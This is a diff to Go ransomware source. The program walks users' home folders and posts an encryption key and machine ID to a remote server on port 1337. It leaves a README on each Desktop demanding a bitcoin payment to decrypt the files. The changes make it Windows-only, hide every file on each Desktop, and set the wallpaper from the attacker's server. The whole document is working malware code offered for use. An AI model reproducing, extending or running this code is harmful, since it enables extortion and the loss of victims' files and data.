@@ -1,3 +1,4 @@
+// +build windows
 package main
 
 import (
@@ -10,6 +11,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/denisbrodbeck/machineid"
+	"github.com/reujab/wallpaper"
 	"io"
 	"io/ioutil"
 	"log"
@@ -18,7 +20,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
-	"runtime"
+	"syscall"
 	"time"
 )
 
@@ -37,6 +39,18 @@ func init() {
 		N: fromBase10(""), // modify this
 		E: 65537,
 	}
+}
+
+func HideFile(filename string) error {
+	filenameW, err := syscall.UTF16PtrFromString(filename)
+	if err != nil {
+		return err
+	}
+	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
+	if err != nil {
+		return err
+	}
+	return nil
 }
 
 func visit(files *[]string) filepath.WalkFunc {
@@ -105,8 +119,8 @@ type PaymentInfo struct {
 	Amount  string
 }
 
-var server string = "example.com:1337" // server address
-var contact string = "keksec@kek.hq"   // whatever address suits you
+var server string = "example.com"    // server address
+var contact string = "keksec@kek.hq" // whatever address suits you
 
 func main() {
 	var files []string
@@ -115,13 +129,9 @@ func main() {
 
 	randomKey := NewEncryptionKey()
 
-	if runtime.GOOS == "windows" {
-		home = os.Getenv("HOMEDRIVE") + "\\Users\\"
-		if home == "" {
-			home = os.Getenv("USERPROFILE")
-		}
-	} else {
-		home = os.Getenv("HOME")
+	home = os.Getenv("HOMEDRIVE") + "\\Users\\"
+	if home == "" {
+		home = os.Getenv("USERPROFILE")
 	}
 
 	err := filepath.Walk(home, visit(&files))
@@ -163,7 +173,7 @@ func main() {
 	fmt.Println("Sending key away.")
 
 	for {
-		response, err := http.PostForm("http://"+server+"/key/", url.Values{
+		response, err := http.PostForm("http://"+server+":1337/key/", url.Values{
 			"key": {hex.EncodeToString(encryptedKey)},
 			"id":  {id},
 		})
@@ -193,20 +203,29 @@ func main() {
 		}
 		text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
 
-		if runtime.GOOS == "windows" {
-			users, err := ioutil.ReadDir(home)
-			if err != nil {
-				log.Fatal(err)
-			}
+		users, err := ioutil.ReadDir(home)
+		if err != nil {
+			log.Fatal(err)
+		}
 
-			for _, user := range users {
-				if user.IsDir() {
-					ioutil.WriteFile(home+user.Name()+"\\Desktop\\README.txt", []byte(text), 0644)
+		for _, user := range users {
+			if user.IsDir() {
+				dfiles, err := ioutil.ReadDir(home + user.Name() + "\\Desktop\\")
+				if err != nil {
+					continue
 				}
-			}
 
-		} else {
-			ioutil.WriteFile(home+"/README.txt", []byte(text), 0644)
+				for _, file := range dfiles {
+					HideFile(home + user.Name() + "\\Desktop\\" + file.Name())
+				}
+
+				ioutil.WriteFile(home+user.Name()+"\\Desktop\\README.txt", []byte(text), 0644)
+			}
+		}
+
+		err = wallpaper.SetFromURL("http://" + server + "/wallpaper.jpg")
+		if err != nil {
+			log.Println(err)
 		}
 		fmt.Println("Script execution completed successfully!")
 
